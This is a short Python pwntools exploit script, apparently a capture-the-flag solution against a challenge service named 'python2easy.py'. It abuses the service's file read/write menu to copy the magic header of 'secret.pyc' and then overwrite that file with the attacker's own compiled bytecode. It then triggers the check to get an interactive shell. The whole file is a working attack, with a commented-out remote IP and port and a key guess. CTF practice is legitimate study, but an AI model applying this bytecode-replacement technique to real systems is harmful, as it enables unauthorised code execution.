import pwn
import pwnlib
import time
import py_compile

pwn.context.terminal = ['tmux', 'splitw', '-h']

def readfile(filename):
    # index
    p.sendlineafter('input your choice:', '0')
    p.sendlineafter('input filename :', filename)
    return p.recvline()

def writefile(filename, payload):
    # index
    p.sendlineafter('input your choice:', '1')
    p.sendlineafter('input filename :', filename)
    p.sendlineafter('input data in hex :', payload)

def crack(guess):
    p.sendlineafter('input your choice:', '2')
    p.sendline('echo "YOU GOT THE SHELL YOU NOUGHTY BOI!"')
    p.interactive()
    # p.sendlineafter('input secret key :', guess)
    # return p.recvall()

if __name__=='__main__':
    global p

    py_compile.compile('_my_secret.py')
    with open('_my_secret.pyc', 'rb') as in_pyc:
        my_pyc = in_pyc.read()[8:]

    if pwnlib.args.args['REMOTE']:
        # p = pwn.connect('35.201.132.60', 12000)
        pass
    else:
        p = pwn.process('./python2easy.py')

    # input name
    p.sendlineafter('Your Name:', 'toosyou')

    # get old menu
    p.recvline_startswith('The old key is ')

    # fake secret.pyc
    pyc_magic = readfile('./secret.pyc')[:-1].decode('hex')[:8]
    writefile('secret.pyc', (pyc_magic+my_pyc).encode('hex'))

    time.sleep(0.5)

    crack('123')

    # print crack('e15b079cb5ba6eec8359fd99b2f8e9e37213d8a7d07e468513cf7575515c304f')
